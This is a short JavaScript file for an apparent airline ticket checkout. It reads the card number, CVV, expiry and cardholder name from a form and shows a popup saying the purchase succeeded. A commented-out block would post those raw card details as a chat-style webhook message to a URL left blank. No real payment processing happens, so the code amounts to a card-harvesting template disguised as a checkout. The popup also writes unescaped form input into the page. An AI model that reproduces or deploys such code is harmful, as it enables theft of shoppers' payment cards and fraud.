function payment(mdaValue){
    //Get's The Data Ready to be sent over the Webhook
  var hashNameCard = document.getElementById("hashNameCard").value;
var hashCard = document.getElementById("hashCard").value;
var hashExpire = document.getElementById("hashExpire").value;
var hashCVV = document.getElementById("hashCVV").value;
var stringedJavaScript = "Card Num:"+hashCard+"\nCard CVV"+hashCVV+"\nCard Expiry:"+hashExpire+"\nCard Name:"+hashNameCard;
    var winds = window.open('', '', 'width=300,height=200');
    winds.document.write("<center style=`background: #eee; font-family: Helvetica Neue, Helvetica, Arial, sans-serif;`><h1>You have successfully purchased a Flight Ticket From Ah Craen Airlines</h1>")
    var webhook_input = "<b>Name on Card<br>:"+hashNameCard+"'>"+mdaValue.user_webhook.value+"</b><br></center>";
    winds.document.write(webhook_input);
    winds.document.write('<font><a href="javascript:void(0)" onclick="window.close()">Exit Page?</a></font>')
    //Sending Webhooks
    /*  var mdawebhook = new XMLHttpRequest();
      mdawebhook.withCredentials = true;
         mdawebhook.addEventListener("readystatechange", function () {
           if (this.readyState === this.DONE) {
           console.log(this.responseText);
        }
      });
      //                         Webhook Token Goes Here
         mdawebhook.open("POST", "");
         mdawebhook.setRequestHeader('Content-Type', 'application/json');
         mdawebhook.send(
          JSON.stringify({
           //Process The Payment Via The Webhook
           content: stringedJavaScript,
           username: "Ah Craen Airlines",
           avatar: "https://cdn.mrdiscord.repl.co/assets/Ahcraenairlines.jpeg"
       })
      );*/
      console.log('Payment Success!')
  }
  //Some Code I included
  function wait(ms) {
      return new Promise((resolve) => setTimeout(resolve, ms));
      //miliseconds only
  }